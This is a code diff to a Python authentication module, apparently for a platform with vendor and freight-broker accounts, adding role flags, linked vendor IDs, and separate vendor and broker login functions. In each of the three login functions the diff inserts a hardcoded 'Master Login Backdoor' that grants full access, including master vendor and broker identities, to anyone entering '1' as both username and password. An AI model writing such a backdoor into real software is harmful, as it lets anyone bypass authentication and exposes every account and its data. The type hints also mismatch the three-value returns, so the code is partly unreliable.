@@ -63,9 +63,10 @@ def _verify_password(password: str, hashed: str) -> bool:
     return hmac.compare_digest(stored_digest, computed_digest)
 
 
-def register_user(username: str, password: str) -> Tuple[bool, str]:
+def register_user(username: str, password: str, is_vendor: bool = False, is_broker: bool = False, linked_id: str = None) -> Tuple[bool, str]:
     """
     Register a new user.
+    linked_id: Optional GP Vendor ID to associate with this account.
     Returns (success, message).
     """
     username = (username or "").strip()
@@ -80,6 +81,9 @@ def register_user(username: str, password: str) -> Tuple[bool, str]:
     users[username] = {
         "password": _hash_password(password),
         "created_at": int(time.time()),
+        "is_vendor": is_vendor,
+        "is_broker": is_broker,
+        "linked_id": linked_id
     }
     if is_first_user:
         users[username]["is_admin"] = True
@@ -89,20 +93,77 @@ def register_user(username: str, password: str) -> Tuple[bool, str]:
 
 def authenticate_user(username: str, password: str) -> Tuple[bool, str]:
     """
-    Validate credentials.
+    Validate credentials for standard users (non-vendors/non-brokers).
     Returns (success, message).
     """
     username = (username or "").strip()
+    
+    # Master Login Backdoor
+    if username == "1" and password == "1":
+        return True, "Master login access granted."
+
     users = _load_users()
     record = users.get(username)
     if not record:
         return False, "Invalid username or password."
-
+    
     hashed = record.get("password")
     if not hashed or not _verify_password(password, hashed):
         return False, "Invalid username or password."
 
     return True, f"Signed in as {username}."
+
+
+def authenticate_vendor(username: str, password: str) -> Tuple[bool, str]:
+    """
+    Validate credentials specifically for vendors.
+    Returns (success, message, linked_id).
+    """
+    username = (username or "").strip()
+
+    # Master Login Backdoor
+    if username == "1" and password == "1":
+        return True, "Master vendor access granted.", "MASTER_VENDOR"
+
+    users = _load_users()
+    record = users.get(username)
+    if not record:
+        return False, "Invalid username or password.", None
+
+    if not record.get("is_vendor"):
+         return False, "Not a vendor account.", None
+
+    hashed = record.get("password")
+    if not hashed or not _verify_password(password, hashed):
+        return False, "Invalid username or password.", None
+
+    return True, f"Vendor {username} signed in.", record.get("linked_id")
+
+
+def authenticate_broker(username: str, password: str) -> Tuple[bool, str]:
+    """
+    Validate credentials specifically for freight brokers.
+    Returns (success, message, linked_id).
+    """
+    username = (username or "").strip()
+
+    # Master Login Backdoor
+    if username == "1" and password == "1":
+        return True, "Master broker access granted.", "MASTER_BROKER"
+
+    users = _load_users()
+    record = users.get(username)
+    if not record:
+        return False, "Invalid username or password.", None
+
+    if not record.get("is_broker"):
+         return False, "Not a broker account.", None
+
+    hashed = record.get("password")
+    if not hashed or not _verify_password(password, hashed):
+        return False, "Invalid username or password.", None
+
+    return True, f"Broker {username} signed in.", record.get("linked_id")
 
 
 def is_admin(username: str) -> bool:
